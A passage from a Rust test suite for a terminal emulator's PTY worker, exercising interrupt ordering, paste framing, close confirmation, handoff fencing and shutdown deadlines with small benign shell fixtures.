        let (mut worker, _) = capture_worker();
        let (commands, receiver) = command_channel(4);
        worker.commands = receiver;
        let (reply, _) = crossbeam_channel::bounded(1);
        commands
            .send(Command::CloseChecked {
                allow_active: false,
                deadline: std::time::Instant::now() + Duration::from_secs(3),
                reply,
            })
            .unwrap();
        let mut carried = None;
        let _ = coalesce_scroll_command(
            Command::Scroll(ScrollCommand::Delta(1)),
            &worker.commands,
            &mut carried,
        );
        assert!(matches!(carried, Some(Command::CloseChecked { .. })));
        worker
            .retained_commands
            .push_back(Command::Resize(TerminalSize {
                columns: 81,
                rows: 24,
                cell_width_px: 1,
                cell_height_px: 1,
            }));
        let selected = worker.retained_commands.pop_front().unwrap();
        worker.published.request_interrupt(None);
        assert!(worker.command_before_interrupt(selected).is_none());
        worker.interrupt_input();
        assert!(
            matches!(carried, Some(Command::CloseChecked { .. })),
            "pending scroll control must retain ownership"
        );
        assert!(matches!(
            worker.retained_commands.pop_front(),
            Some(Command::Resize(_))
        ));
        drop(commands);
        worker.run();
    }

    #[test]
    fn priority_interrupt_preserves_input_submitted_after_its_boundary() {
        let (mut worker, _) = capture_worker_for(
            shell_session("stty raw -echo; printf 'ready\\r\\n'; kill -STOP $$; od -An -tu1 -N7")
                .launch,
        );
        let deadline = std::time::Instant::now() + Duration::from_secs(3);
        loop {
            let message = worker
                .pty_rx
                .recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
                .unwrap();
            let ready = matches!(&message, PtyMessage::Bytes(bytes) if bytes.windows(5).any(|word| word == b"ready"));
            worker.handle_pty_message(Some(message));
            if ready {
                break;
            }
        }
        let (commands, receiver) = command_channel(4);
        worker.commands = receiver;
        let published = Arc::clone(&worker.published);
        let handle = TerminalHandle {
            inner: Arc::new(HandleInner {
                commands,
                events: crossbeam_channel::unbounded().1,
                published,
                worker: Arc::new(Mutex::new(None)),
            }),
        };
        handle.paste("canceled", PasteOrigin::Clipboard).unwrap();
        handle.input(vec![3]).unwrap();
        handle.input(b"after\n".to_vec()).unwrap();
        worker.interrupt_input();
        assert_eq!(worker.retained_commands.len(), 1);
        while let Some(command) = worker.retained_commands.pop_front() {
            worker.handle_command(command);
        }
        close_processes::signal(&worker.child.shutdown_pidfd().unwrap(), libc::SIGCONT).unwrap();
        let mut output = String::new();
        let deadline = std::time::Instant::now() + Duration::from_secs(3);
        while std::time::Instant::now() < deadline {
            worker.flush_pty_input();
            match worker.pty_rx.recv_timeout(Duration::from_millis(10)) {
                Ok(PtyMessage::Bytes(bytes)) => output.push_str(&String::from_utf8_lossy(&bytes)),
                Ok(_) | Err(crossbeam_channel::RecvTimeoutError::Disconnected) => break,
                Err(crossbeam_channel::RecvTimeoutError::Timeout) => continue,
            }
            let observed: Vec<u8> = output
                .split_whitespace()
                .filter_map(|word| word.parse().ok())
                .collect();
            if observed.len() >= 7 {
                break;
            }
        }
        let observed: Vec<u8> = output
            .split_whitespace()
            .filter_map(|word| word.parse().ok())
            .collect();
        assert_eq!(observed, b"\x03after\n", "{output}");
        drop(handle);
        worker.run();
    }

    #[test]
    fn hard_pty_write_failure_rejects_input_admission() {
        let (mut worker, events) = capture_worker();
        worker.writer = File::open("/dev/null").unwrap();
        assert!(!worker.write_pty(b"x", "fixture input"));
        assert!(worker.pending_input.is_empty());
        assert!(
            events
                .try_iter()
                .any(|event| matches!(event, TerminalEvent::Error { .. }))
        );
        worker.run();
    }

    #[test]
    fn handoff_refuses_pending_input_without_discarding_it() {
        let (mut worker, _) = capture_worker_for(shell_session("exec cat").launch);
        let directory = tempfile::tempdir_in("/var/tmp").unwrap();
        let socket = directory.path().join("must-not-detach.sock");
        worker.pending_input.extend(b"accepted but not written");
        let expected = worker.pending_input.clone();
        let (reply, result) = crossbeam_channel::bounded(1);
        assert!(!worker.handle_command(Command::CheckInputDrained(reply)));
        assert!(result.recv_timeout(Duration::from_secs(1)).unwrap().is_err());
        let (reply, result) = crossbeam_channel::bounded(1);
        assert!(!worker.handle_command(Command::Carry { socket: socket.clone(), reply }));
        assert!(result.recv_timeout(Duration::from_secs(1)).unwrap().is_err());
        assert_eq!(worker.pending_input, expected);
        assert!(!worker.carried);
        assert!(!socket.exists());
        worker.pending_input.clear();
        assert!(worker.input_drained_for_handoff().is_ok());
        worker.retained_commands.push_back(Command::Input(b"retained".to_vec()));
        assert!(worker.input_drained_for_handoff().is_err());
        worker.retained_commands.clear();
        worker.run();
    }

    #[test]
    fn interrupt_retained_carry_cannot_overtake_post_interrupt_coalesced_input() {
        let (mut worker, _) = capture_worker_for(shell_session("exec cat").launch);
        let (commands, receiver) = command_channel(4);
        worker.commands = receiver;
        // The scroll was selected before priority interruption was published.
        assert!(worker.published.request_interrupt(None));
        let generation = worker.published.input_order.lock().unwrap().generation;
        commands.send(Command::OrderedInput { generation,
            input: Box::new(Command::Input(b"after interrupt".to_vec())) }).unwrap();
        let (reply, result) = crossbeam_channel::bounded(1);
        let directory = tempfile::tempdir_in("/var/tmp").unwrap();
        let socket = directory.path().join("must-not-detach.sock");
        commands.send(Command::Carry { socket: socket.clone(), reply }).unwrap();
        let mut carried = None;
        let scroll = coalesce_scroll_command(Command::Scroll(ScrollCommand::Delta(1)), &worker.commands, &mut carried);
        assert!(matches!(scroll, Command::Scroll(_)));
        assert!(matches!(carried, Some(Command::OrderedInput { .. })));
        let boundary = worker.interrupt_input();
        assert!(!is_cancelable_input_before(carried.as_ref().unwrap(), boundary));
        let command = worker.retained_commands.pop_front().expect("retained carry control");
        assert!(matches!(command, Command::Carry { .. }));
        worker.retain_carried_for_handoff(&command, &mut carried);
        assert!(!worker.handle_command(command));
        assert!(result.recv_timeout(Duration::from_secs(1)).unwrap().is_err());
        assert!(carried.is_none());
        assert!(matches!(worker.retained_commands.front(), Some(Command::OrderedInput { .. })));
        assert!(!worker.carried);
        assert!(!socket.exists());
        worker.retained_commands.clear();
        drop(commands);
        worker.run();
    }

    #[test]
    fn handoff_fence_refuses_both_ordinary_and_priority_input() {
        let (mut worker, events) = capture_worker_for(shell_session("exec cat").launch);
        let (commands, receiver) = command_channel(4);
        worker.commands = receiver;
        let handle = TerminalHandle { inner: Arc::new(HandleInner {
            commands, events, published: worker.published.clone(), worker: Arc::new(Mutex::new(None)),
        }) };
        worker.published.input_order.lock().unwrap().handoff = true;
        assert_eq!(handle.input(b"later".to_vec()), Err(TerminalSendError::Closed));
        assert_eq!(handle.input(vec![3]), Err(TerminalSendError::Closed));
        assert!(worker.commands.is_empty());
        assert!(!worker.published.interrupt_requested.load(Ordering::Acquire));
        worker.published.input_order.lock().unwrap().handoff = false;
        assert!(handle.input(b"allowed".to_vec()).is_ok());
        assert!(!worker.commands.is_empty());
        drop(handle);
        worker.run();
    }

    #[test]
    fn queued_and_pending_input_require_close_confirmation() {
        let home = tempfile::tempdir_in("/var/tmp").unwrap();
        let launch = LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/bash".into(),
            arguments: vec!["--noprofile".into(), "--norc".into(), "-i".into()],
            working_directory: home.path().into(),
            environment: BTreeMap::from([
                ("HOME".into(), home.path().to_string_lossy().into_owned()),
                ("HISTFILE".into(), "/dev/null".into()),
                (
                    "PS1".into(),
                    r"\[\e]133;A\a\]CENSUS_READY> \[\e]133;B\a\]".into(),
                ),
            ]),
        };
        let (mut worker, _) = capture_worker_for(launch);
        let deadline = std::time::Instant::now() + Duration::from_secs(3);
        let mut prompt_bytes = Vec::new();
        loop {
            let message = worker
                .pty_rx
                .recv_timeout(deadline.saturating_duration_since(std::time::Instant::now()))
                .unwrap_or_else(|error| panic!(
                    "Integrated Bash prompt did not finish: {error}; output={:?}; exit={:?}",
                    String::from_utf8_lossy(&prompt_bytes), worker.child_exit_rx.try_recv(),
                ));
            if let PtyMessage::Bytes(bytes) = &message {
                prompt_bytes.extend_from_slice(bytes);
            }
            let ready = prompt_bytes
                .windows(b"\x1b]133;B\x07".len())
                .any(|word| word == b"\x1b]133;B\x07");
            // handle_pty_message coalesces additional reader messages. Feed
            // the full startup batch only after collecting the delimiter, so
            // that coalescing cannot consume the marker behind this observer.
            if ready {
                worker.process_output(prompt_bytes);
                break;
            }
        }
        let active = |worker: &Worker| {
            worker
                .inspect_close(std::time::Instant::now() + Duration::from_secs(3))
                .unwrap()
                .0
        };
        assert!(
            !active(&worker),
            "fixture must start as a proven idle shell"
        );
        let (commands, receiver) = command_channel(1);
        worker.commands = receiver;
        commands.send(Command::Input(b"unsent".to_vec())).unwrap();
        assert!(
            active(&worker),
            "priority close must see accepted input still in its inbox"
        );
        let _ = worker.commands.try_recv();
        worker.pending_input.extend(b"pending");
        assert!(
            active(&worker),
            "accepted bytes cannot be silently closed before delivery"
        );
        worker.pending_input.clear();
        worker
            .retained_commands
            .push_back(Command::Input(b"carried".to_vec()));
        assert!(
            active(&worker),
            "coalesced/cancellation carry must also be inspected"
        );
        worker.retained_commands.clear();
        assert!(!active(&worker));
        drop(commands);
        worker.run();
    }

    #[test]
    fn worktree_scope_does_not_follow_a_retargeted_launch_alias() {
        let root = tempfile::tempdir_in("/var/tmp").unwrap();
        let outside = root.path().join("outside"); let selected = root.path().join("selected");
        std::fs::create_dir(&outside).unwrap(); std::fs::create_dir(&selected).unwrap();
        let alias = root.path().join("alias"); std::os::unix::fs::symlink(&outside, &alias).unwrap();
        let mut session = shell_session("echo PHYSICAL_READY; sleep 600");
        session.launch.working_directory = alias.clone();
        let handle = TerminalHandle::spawn(session, TerminalConfig::default(), |_| {}).unwrap();
        wait_for_text(&handle, "PHYSICAL_READY");
        let (directory, _) = handle.admitted_directory().unwrap();
        let physical = || std::fs::read_link(format!("/proc/self/fd/{}", directory.as_raw_fd())).unwrap();
        assert_eq!(physical(), outside);
        std::fs::remove_file(&alias).unwrap(); std::os::unix::fs::symlink(&selected, &alias).unwrap();
        assert_eq!(alias.canonicalize().unwrap(), selected);
        assert_eq!(physical(), outside, "changing a recipe alias must never grant close authority over another worktree");
        let moved = root.path().join("moved-original");
        std::fs::rename(&outside, &moved).unwrap();
        assert_eq!(physical(), moved, "verified same-inode moves retain physical source authority");
        handle.shutdown().unwrap();
    }

    #[test]
    fn whole_session_stop_checks_worker_identity_and_fences_every_input_path() {
        let handle=TerminalHandle::spawn(shell_session("echo STOP_SESSION_READY; exec sleep 600"),TerminalConfig::default(),|_|{}).unwrap();
        wait_for_text(&handle,"STOP_SESSION_READY");
        let deadline=std::time::Instant::now()+Duration::from_secs(5);
        assert!(handle.fence_session_stop(uuid::Uuid::new_v4(),deadline).is_err());
        assert!(!handle.inner.published.input_order.lock().unwrap().closing);
        let stop=handle.fence_session_stop(handle.execution_instance(),deadline).unwrap();
        assert_eq!(handle.input(b"new work".to_vec()),Err(TerminalSendError::Closed));
        assert_eq!(handle.input(vec![3]),Err(TerminalSendError::Closed));
        assert!(handle.preserve_for_restart().is_err(),"a stop winner must not subsequently detach the holder");
        stop.finish(deadline).unwrap();
        assert!(handle.is_completed());
    }

    #[test]
    fn preserve_admission_winner_prevents_session_stop_from_killing_successor_ownership() {
        let (mut worker,events)=capture_worker_for(shell_session("exec cat").launch);
        let (commands,receiver)=command_channel(4);worker.commands=receiver;
        let handle=TerminalHandle {inner:Arc::new(HandleInner {commands,events,published:worker.published.clone(),worker:Mutex::new(None)})};
        let preserving=handle.clone();
        let call=thread::spawn(move||preserving.preserve_for_restart());
        let command=worker.commands.recv_timeout(Duration::from_secs(2)).unwrap();
        assert!(worker.published.input_order.lock().unwrap().handoff,"handoff must be fenced before enqueue");
        assert!(handle.fence_session_stop(handle.execution_instance(),std::time::Instant::now()+Duration::from_secs(2)).is_err());
        assert!(!worker.published.input_order.lock().unwrap().closing);
        let Command::PreserveForRestart(reply)=command else {panic!("expected ownership-preservation command")};
        reply.send(Err("fixture refuses preservation".into())).unwrap();
        assert!(call.join().unwrap().is_err());
        assert!(worker.published.priority_close.lock().unwrap().is_none());
        drop(handle);worker.run();
    }

    #[test]
    fn worktree_close_fence_rejects_priority_interrupt_admission() {
        let handle = TerminalHandle::spawn(shell_session("echo FENCE_READY; sleep 600"), TerminalConfig::default(), |_| {}).unwrap();
        wait_for_text(&handle, "FENCE_READY");
        handle.inner.published.input_order.lock().unwrap().closing = true;
        assert_eq!(handle.input(vec![3]), Err(TerminalSendError::Closed));
        assert_eq!(handle.input(b"new-work".to_vec()), Err(TerminalSendError::Closed));
        handle.shutdown().unwrap();
    }

    #[test]
    fn worktree_census_reads_resident_state_without_a_worker_or_process_probe() {
        let published=PublishedState::new(false,Arc::new(|_|panic!("a readonly census must not wake a worker")));
        assert_eq!(published.close_observation().unwrap(),(0,true),"an unknown builtin shell is never proven idle");
        published.input_order.lock().unwrap().close_revision=7;
        *published.agent_activity.lock().unwrap()=Some(crate::agent::Activity {provider:crate::agent::Provider::Codex,state:crate::agent::ActivityState::Idle});
        assert_eq!(published.close_observation().unwrap(),(7,false));
        published.input_order.lock().unwrap().handoff=true;
        assert!(published.close_observation().is_err(),"a transfer cannot supply stable consent");
        published.completed.store(true,Ordering::Release);
        assert_eq!(published.close_observation().unwrap(),(7,false),"completed cleanup remains census-visible and retryable");
    }

    #[test]
    fn worktree_close_refuses_replaced_input_revision_and_unknown_busy_turns() {
        let handle = TerminalHandle::spawn(shell_session("echo CONSENT_READY; sleep 600"), TerminalConfig::default(), |_| {}).unwrap();
        wait_for_text(&handle, "CONSENT_READY");
        let (consent, active) = handle.close_observation().unwrap();
        assert!(active);
        assert!(handle.close_if_revision(consent).unwrap_err().contains("work is unchanged"));
        assert!(!handle.is_completed(), "refusing unknown turn ownership must preserve its process");
        handle.input(b"queued-after-consent".to_vec()).unwrap();
        assert!(handle.close_if_revision(consent).unwrap_err().contains("changed after close consent"));
        assert!(!handle.is_completed());
        handle.shutdown().unwrap();
    }

    #[test]
    fn checked_close_bypasses_a_saturated_input_inbox() {
        let (commands, receiver) = command_channel(1);
        commands
            .send(Command::Input(vec![b'x'; 1024 * 1024]))
            .unwrap();
        let (ready, initialized) = crossbeam_channel::bounded(1);
        let (run, start) = crossbeam_channel::bounded::<()>(1);
        let thread = thread::spawn(move || {
            let (mut worker, _) = capture_worker_for(shell_session("exec sleep 600").launch);
            worker.commands = receiver;
            ready.send(Arc::clone(&worker.published)).unwrap();
            start.recv_timeout(Duration::from_secs(3)).unwrap();
            worker.run();
        });
        let published = initialized.recv_timeout(Duration::from_secs(3)).unwrap();
        let handle = TerminalHandle {
            inner: Arc::new(HandleInner {
                commands,
                events: crossbeam_channel::unbounded().1,
                published,
                worker: Arc::new(Mutex::new(Some(thread))),
            }),
        };
        let closing = handle.clone();
        let closer = thread::spawn(move || closing.close_checked(true));
        let deadline = std::time::Instant::now() + Duration::from_secs(1);
        while handle
            .inner
            .published
            .priority_close
            .lock()
            .unwrap()
            .is_none()
        {
            assert!(
                std::time::Instant::now() < deadline,
                "close inspection was rejected by ordinary inbox"
            );
            thread::yield_now();
        }
        assert_eq!(
            handle.inner.commands.len(),
            1,
            "priority close cannot consume queued paste before inspection"
        );
        run.send(()).unwrap();
        assert_eq!(
            closer.join().unwrap(),
            super::super::ipc::TerminalCloseResult::Closed
        );
        assert!(handle.is_completed());
    }

    #[test]
    fn priority_interrupt_obeys_completed_and_released_admission() {
        let handle =
            TerminalHandle::spawn(shell_session("exit 0"), TerminalConfig::default(), |_| {})
                .unwrap();
        let deadline = std::time::Instant::now() + Duration::from_secs(3);
        while !handle.is_completed() {
            assert!(std::time::Instant::now() < deadline);
            thread::sleep(Duration::from_millis(5));
        }
        for released in [false, true] {
            if released {
                handle.release_completed_holder();
            }
            assert_eq!(
                handle.input(b"ordinary".to_vec()),
                Err(TerminalSendError::Closed)
            );
            assert_eq!(handle.input(vec![3]), Err(TerminalSendError::Closed));
            let mut key = key_input(
                KeyAction::Press,
                TerminalKey::Character('c'),
                Some("c"),
                Some('c'),
            );
            key.modifiers.control = true;
            assert_eq!(handle.key(key), Err(TerminalSendError::Closed));
            assert!(
                !handle
                    .inner
                    .published
                    .interrupt_requested
                    .load(Ordering::Acquire)
            );
        }
        handle.shutdown().unwrap();
    }

    #[test]
    fn concurrent_checked_close_cannot_hold_shutdown_behind_its_join() {
        let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
        let completion = Arc::clone(&published);
        let (commands, _receiver) = command_channel(1);
        let (_events, event_receiver) = crossbeam_channel::unbounded();
        let (release, blocked) = crossbeam_channel::bounded::<()>(1);
        let (ready, observed) = crossbeam_channel::bounded(1);
        let worker = thread::spawn(move || {
            completion
                .capture_rx
                .recv_timeout(Duration::from_secs(1))
                .unwrap();
            let Some(Command::CloseChecked { reply, .. }) =
                completion.priority_close.lock().unwrap().take()
            else {
                panic!("expected priority close");
            };
            reply
                .send(super::super::ipc::TerminalCloseResult::Closed)
                .unwrap();
            ready.send(()).unwrap();
            let _ = blocked.recv();
            completion.completed.store(true, Ordering::Release);
        });
        let handle = TerminalHandle {
            inner: Arc::new(HandleInner {
                commands,
                events: event_receiver,
                published,
                worker: Arc::new(Mutex::new(Some(worker))),
            }),
        };
        let closing = handle.clone();
        let closer = thread::spawn(move || closing.close_checked(true));
        observed.recv_timeout(Duration::from_secs(1)).unwrap();
        let join_deadline = std::time::Instant::now() + Duration::from_secs(1);
        while handle.inner.worker.lock().unwrap().is_some() {
            assert!(std::time::Instant::now() < join_deadline);
            thread::yield_now();
        }
        let started = std::time::Instant::now();
        assert_eq!(handle.shutdown(), Err(TerminalSendError::Closed));
        assert!(
            started.elapsed() < Duration::from_millis(500),
            "shutdown waited on a lock held by join"
        );
        release.send(()).unwrap();
        assert_eq!(
            closer.join().unwrap(),
            super::super::ipc::TerminalCloseResult::Closed
        );
    }

    #[test]
    fn interrupt_discards_kernel_buffered_paste_before_the_next_prompt() {
        let handle = TerminalHandle::spawn(
            shell_session(r#"stty -echo -icanon; trap 'echo interrupted' INT; echo ready; sleep 600; echo prompt; read line; printf 'received:%s\n' "$line""#),
            TerminalConfig::default(), |_| {},
        ).unwrap();
        wait_for_text(&handle, "ready");
        handle
            .paste("x".repeat(1024 * 1024), PasteOrigin::Clipboard)
            .unwrap();
        thread::sleep(Duration::from_millis(100));
        handle.input(vec![3]).unwrap();
        wait_for_text(&handle, "prompt");
        handle.input(b"after\n".to_vec()).unwrap();
        wait_for_text(&handle, "received:after");
        handle.shutdown().unwrap();
    }

    fn latched_tls_worker() -> (JoinHandle<()>, crossbeam_channel::Sender<()>) {
        struct Cleanup { entered: Sender<()>, release: Receiver<()> }
        impl Drop for Cleanup { fn drop(&mut self) { self.entered.send(()).unwrap(); let _ = self.release.recv(); } }
        thread_local! { static CLEANUP: RefCell<Option<Cleanup>> = const { RefCell::new(None) }; }
        let (entered, observed) = crossbeam_channel::bounded(1);
        let (release, blocked) = crossbeam_channel::bounded(1);
        let worker = thread::spawn(move || CLEANUP.with(|slot| *slot.borrow_mut() = Some(Cleanup { entered, release: blocked })));
        observed.recv_timeout(Duration::from_secs(2)).unwrap();
        let deadline = Instant::now() + Duration::from_secs(2);
        while !worker.is_finished() { assert!(Instant::now() < deadline); thread::yield_now(); }
        (worker, release)
    }

    #[test]
    fn worker_join_deadline_includes_blocked_tls_destruction() {
        struct Release(Sender<()>);
        impl Drop for Release { fn drop(&mut self) { let _ = self.0.try_send(()); } }
        let (worker, release) = latched_tls_worker();
        let release = Release(release);
        let slot = Arc::new(Mutex::new(Some(worker)));
        let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
        let started = Instant::now();
        assert!(!joins::join_until(&slot, &published, started + Duration::from_millis(40), false, true));
        assert!(started.elapsed() < Duration::from_millis(250), "is_finished must not authorize caller-side pthread join");
        assert_eq!(published.worker_join.load(Ordering::Acquire), 1);
        assert!(Arc::strong_count(&slot) > 1, "the exact join slot remains owned by the shared service");
        drop(release);
        let deadline = Instant::now() + Duration::from_secs(2);
        while published.worker_join.load(Ordering::Acquire) == 1 { assert!(Instant::now() < deadline); thread::yield_now(); }
        assert!(joins::join_until(&slot, &published, deadline, false, true));
    }

    #[test]
    fn final_handle_drop_does_not_join_a_blocked_tls_destructor() {
        struct Release(Sender<()>);
        impl Drop for Release { fn drop(&mut self) { let _ = self.0.try_send(()); } }
        let (worker, release) = latched_tls_worker(); let release = Release(release);
        let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
        let slot = Arc::new(Mutex::new(Some(worker)));
        let handle = TerminalHandle { inner: Arc::new(HandleInner {
            commands: command_channel(1).0, events: crossbeam_channel::unbounded().1,
            published: Arc::clone(&published), worker: Arc::clone(&slot),
        }) };
        let started = Instant::now(); drop(handle);
        assert!(started.elapsed() < Duration::from_millis(250));
        assert_eq!(published.worker_join.load(Ordering::Acquire), 1);
        drop(release);
        let deadline = Instant::now() + Duration::from_secs(2);
        while published.worker_join.load(Ordering::Acquire) == 1 { assert!(Instant::now() < deadline); thread::yield_now(); }
        assert_eq!(published.worker_join.load(Ordering::Acquire), 2);
    }

    #[test]
    fn final_drop_reserves_cleanup_capacity_before_any_terminal_child_starts() {
        const CHILD: &str = "CAGENTS_TERMINAL_JOIN_RESERVATION_FIXTURE";
        if std::env::var_os(CHILD).is_none() {
            let output = std::process::Command::new(std::env::current_exe().unwrap())
                .args(["--exact", "terminal::worker::tests::final_drop_reserves_cleanup_capacity_before_any_terminal_child_starts", "--nocapture", "--test-threads=1"])
                .env(CHILD, "1").env("CAGENTS_TERMINAL_JOIN_TEST_CAPACITY", "4").output().unwrap();
            assert!(output.status.success(), "stdout={} stderr={}", String::from_utf8_lossy(&output.stdout), String::from_utf8_lossy(&output.stderr));
            return;
        }
        struct Releases(Vec<Sender<()>>);
        impl Drop for Releases { fn drop(&mut self) { for release in &self.0 { let _ = release.try_send(()); } } }
        let mut releases = Releases(Vec::new()); let mut owners = Vec::new(); let mut slots = Vec::new();
        for _ in 0..4 {
            let reservation = joins::reserve().unwrap();
            let (worker, release) = latched_tls_worker(); releases.0.push(release);
            let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
            published.join_reservation.set(reservation).unwrap();
            let descriptor = unsafe { libc::syscall(libc::SYS_pidfd_open, std::process::id(), 0) };
            assert!(descriptor >= 0);
            published.shutdown_pidfd.set(unsafe { File::from_raw_fd(descriptor as i32) }).unwrap();
            let slot = Arc::new(Mutex::new(Some(worker)));
            owners.push(Arc::downgrade(&published)); slots.push(Arc::downgrade(&slot));
            let handle = TerminalHandle { inner: Arc::new(HandleInner {
                commands: command_channel(1).0, events: crossbeam_channel::unbounded().1, published, worker: slot,
            }) };
            let started = Instant::now(); drop(handle);
            assert!(started.elapsed() < Duration::from_millis(250));
        }
        assert!(slots.iter().all(|slot| slot.upgrade().is_some()), "saturated final Drop must retain every original worker slot");
        assert!(owners.iter().all(|owner| owner.upgrade().is_some_and(|owner| owner.worker_join.load(Ordering::Acquire) == 1 && owner.shutdown_pidfd.get().is_some())), "queued and active joins retain each original pidfd owner");
        let directory = tempfile::tempdir_in("/var/tmp").unwrap(); let marker = directory.path().join("child-started");
        let mut source = shell_session("printf started > \"$MARKER\"; exec /bin/cat");
        source.launch.environment.insert("MARKER".into(), marker.to_string_lossy().into_owned());
        let error = TerminalHandle::spawn(source.clone(), Default::default(), |_| {}).unwrap_err();
        assert!(error.to_string().contains("cleanup capacity"));
        assert!(!marker.exists(), "capacity refusal must precede actual child startup");
        drop(releases);
        let deadline = Instant::now() + Duration::from_secs(3);
        while owners.iter().any(|owner| owner.upgrade().is_some()) { assert!(Instant::now() < deadline); thread::yield_now(); }
        assert!(slots.iter().all(|slot| slot.upgrade().is_none()));
        let handle = TerminalHandle::spawn(source, Default::default(), |_| {}).unwrap();
        let deadline = Instant::now() + Duration::from_secs(3);
        while !std::fs::read_to_string(&marker).is_ok_and(|text| text == "started") {
            assert!(Instant::now() < deadline, "admission recovery must actually start the retained recipe");
            thread::yield_now();
        }
        handle.input(b"capacity-recovered\n").unwrap(); wait_for_text(&handle, "capacity-recovered");
        handle.shutdown().unwrap();
    }

    #[test]
    fn shutdown_deadline_releases_a_wedged_worker_without_claiming_completion() {
        let published = Arc::new(PublishedState::new(true, Arc::new(|_| {})));
        let (commands, _receiver) = command_channel(1);
        let (_events, event_receiver) = crossbeam_channel::unbounded();
        let (release, blocked) = crossbeam_channel::bounded::<()>(1);
        let worker = thread::spawn(move || {
            let _ = blocked.recv();
        });
        let handle = TerminalHandle {
            inner: Arc::new(HandleInner {
                commands,
                events: event_receiver,
                published,
                worker: Arc::new(Mutex::new(Some(worker))),
            }),
        };
        let started = std::time::Instant::now();
        assert_eq!(handle.shutdown(), Err(TerminalSendError::Closed));
        assert!(started.elapsed() < WORKER_JOIN_TIMEOUT + Duration::from_secs(1));
        release.send(()).unwrap();
    }

    #[test]
    fn default_scrollback_byte_budget_retains_over_ten_thousand_rows() {
        let config = TerminalConfig::default();
        let mut terminal = Terminal::new(TerminalOptions {
            cols: config.columns,
            rows: config.rows,
            max_scrollback: config.max_scrollback_bytes,
        })
        .unwrap();
        terminal.vt_write(&b"output\r\n".repeat(20_000));
        assert!(terminal.scrollbar().unwrap().total > 10_000);
    }

    #[test]
    fn scrollback_byte_budget_changes_retained_history() {
        let retained = |budget| {
            let mut terminal = Terminal::new(TerminalOptions {
                cols: 80,
                rows: 24,
                max_scrollback: budget,
            })
            .unwrap();
            terminal.vt_write(&b"output\r\n".repeat(20_000));
            terminal.scrollbar().unwrap().total
        };
        let low = retained(2 * 1024 * 1024);
        let high = retained(TerminalConfig::default().max_scrollback_bytes);
        assert!(high > low * 2, "low={low}, high={high}");
    }

    #[test]
    fn shutdown_bypasses_a_saturated_input_queue_and_coalesced_wake() {
        let (mut worker, events) = capture_worker();
        let expected = worker.current_size;
        let (commands, receiver) = command_channel(1);
        commands
            .send(Command::Resize(TerminalSize {
                columns: 100,
                rows: 40,
                ..expected
            }))
            .unwrap();
        worker.commands = receiver;
        let handle = TerminalHandle {
            inner: Arc::new(HandleInner {
                commands,
                events,
                published: Arc::clone(&worker.published),
                worker: Arc::new(Mutex::new(None)),
            }),
        };
        assert!(handle.inner.commands.is_full());
        let _ = handle.inner.published.capture_tx.try_send(());
        handle.request_shutdown();
        worker.run();
        assert!(handle.is_completed());
        assert_eq!(handle.snapshot().columns, expected.columns);
        assert!(handle.shutdown().is_ok());
    }

    #[test]
    fn shutdown_preserves_already_parsed_dirty_contents() {
        let (mut worker, _) = capture_worker();
        worker.publish_snapshot(true);
        worker.process_output(b"before shutdown".to_vec());
        let published = Arc::clone(&worker.published);
        let (commands, receiver) = command_channel(1);
        commands.send(Command::Shutdown).unwrap();
        worker.commands = receiver;
        worker.run();
        assert_eq!(
            published.snapshot.load().lines[0]
                .cells
                .iter()
                .take(15)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "before shutdown"
        );
    }

    #[test]
    fn leader_exit_does_not_end_output_capture_or_redraw_credit() {
        let (mut worker, events) = capture_worker();
        let published = Arc::clone(&worker.published);
        worker.publish_snapshot(true);
        let mut exited = false;
        worker.handle_child_exit(&mut exited, Ok(ExitStatus::with_exit_code(0)));
        assert!(matches!(
            events.try_recv(),
            Ok(TerminalEvent::Exited { .. })
        ));
        worker.process_output(b"descendant".to_vec());
        worker.published.acknowledge(worker.generation);
        worker.capture_if_ready();
        assert_eq!(
            worker.published.snapshot.load().lines[0]
                .cells
                .iter()
                .take(10)
                .map(|cell| cell.text.as_str())
                .collect::<String>(),
            "descendant"
        );
        assert!(
            events
                .try_iter()
                .all(|event| !matches!(event, TerminalEvent::Completed { .. })),
            "root exit must not finalize a PTY still owned by descendants"
        );
        worker.run();
        assert!(
            events
                .try_iter()
                .any(|event| matches!(event, TerminalEvent::Completed { .. })),
            "worker teardown publishes the distinct final completion event"
        );
        assert!(
            published.completed.load(Ordering::Acquire),
            "observing final completion must also certify ended continuity"
        );
    }

    fn test_published(visible: bool, wakes: Arc<AtomicUsize>) -> PublishedState {
        PublishedState::new(
            visible,
            Arc::new(move |_| {
                wakes.fetch_add(1, Ordering::SeqCst);
            }),
        )
    }

    fn snapshot(generation: u64) -> Arc<RenderSnapshot> {
        Arc::new(RenderSnapshot {
            generation,
            ..RenderSnapshot::empty()
        })
    }

    fn key_input(
        action: KeyAction,
        key: TerminalKey,
        text: Option<&str>,
        unshifted_codepoint: Option<char>,
    ) -> KeyInput {
        KeyInput {
            action,
            key,
            modifiers: KeyModifiers::default(),
            text: text.map(str::to_owned),
            unshifted_codepoint,
        }
    }

    #[test]
    fn a_paste_is_typed_input_until_the_child_asks_for_brackets() {
        let mut terminal = Terminal::new(TerminalOptions {
            cols: 80,
            rows: 24,
            max_scrollback: 100,
        })
        .unwrap();
        assert_eq!(
            encode_paste(&terminal, "one\r\ntwo\nthree\rfour", PasteOrigin::Clipboard).unwrap(),
            b"one\rtwo\rthree\rfour"
        );
        assert_eq!(
            encode_paste(&terminal, "", PasteOrigin::Clipboard).unwrap(),
            b""
        );

        terminal.vt_write(b"\x1b[?2004h");
        assert_eq!(
            encode_paste(&terminal, "one\ntwo", PasteOrigin::Clipboard).unwrap(),
            b"\x1b[200~one\ntwo\x1b[201~"
        );
        // An empty paste is no paste, not an empty pair of brackets a child
        // would take for one.
        assert_eq!(
            encode_paste(&terminal, "", PasteOrigin::Clipboard).unwrap(),
            b""
        );

        terminal.vt_write(b"\x1b[?2004l");
        assert_eq!(
            encode_paste(&terminal, "a\nb", PasteOrigin::Clipboard).unwrap(),
            b"a\rb"
        );
    }

    /// The mode is read where the child's output is parsed, so a paste that
    /// follows the child enabling bracketed paste is framed, however recently
    /// it asked.
    #[test]
    fn a_paste_reaches_the_child_framed_once_it_asks_for_brackets() {
        let recipe = LaunchRecipe {
            unset_environment: Default::default(),
            program: "/bin/sh".into(),
            arguments: vec![
                "-c".into(),
